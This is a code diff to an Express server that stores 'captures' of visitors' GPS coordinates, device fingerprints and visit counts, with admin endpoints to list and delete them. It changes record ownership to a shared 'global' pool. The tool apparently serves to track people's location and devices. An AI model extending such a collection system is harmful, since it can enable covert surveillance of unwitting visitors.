@@ -269,7 +269,7 @@ function createCapture(req, captures, extra = {}) {
     gps: sanitizeGps(extra.gps || req.body.gps),
     fingerprint,
     visitCount: previousVisits.length + 1,
-    owner: extra.owner || req.body.owner || 'Jassim99x'
+    owner: extra.owner || req.body.owner || 'global'
   };
 }
 
@@ -380,23 +380,26 @@ app.patch('/api/capture/:id', async (req, res) => {
 
 app.get('/api/captures', basicAuth, async (req, res) => {
   const all = await readCaptures();
-  const filtered = all.filter(c => c.owner === req.adminUser);
+  // Filter: Show my isolated data + any global/unassigned data
+  const filtered = all.filter(c => c.owner === req.adminUser || c.owner === 'global');
   res.json(filtered);
 });
 
 app.delete('/api/captures', basicAuth, async (req, res) => {
   const all = await readCaptures();
-  const otherAdminsData = all.filter(c => c.owner !== req.adminUser);
-  await writeCaptures(otherAdminsData);
+  // Keep only data belonging to OTHER admins (not global, not mine)
+  const othersData = all.filter(c => c.owner !== req.adminUser && c.owner !== 'global');
+  await writeCaptures(othersData);
   broadcast('refresh');
-  res.json({ status: 'cleared', deleted: all.length - otherAdminsData.length });
+  res.json({ status: 'cleared', deleted: all.length - othersData.length });
 });
 
 app.delete('/api/captures/:id', basicAuth, async (req, res) => {
   const all = await readCaptures();
   const capture = all.find(c => c.id === req.params.id);
   
-  if (!capture || capture.owner !== req.adminUser) {
+  // Can delete if I own it OR if it is global
+  if (!capture || (capture.owner !== req.adminUser && capture.owner !== 'global')) {
     return res.status(403).json({ error: 'Access denied' });
   }
 
@@ -408,8 +411,8 @@ app.delete('/api/captures/:id', basicAuth, async (req, res) => {
 
 app.delete('/api/devices/:deviceId', basicAuth, async (req, res) => {
   const all = await readCaptures();
-  // Only delete captures for this device that belong to the current admin
-  const filtered = all.filter((c) => !(c.deviceId === req.params.deviceId && c.owner === req.adminUser));
+  // Only delete captures for this device that belong to me OR are global
+  const filtered = all.filter((c) => !(c.deviceId === req.params.deviceId && (c.owner === req.adminUser || c.owner === 'global')));
   await writeCaptures(filtered);
 
   broadcast('refresh');
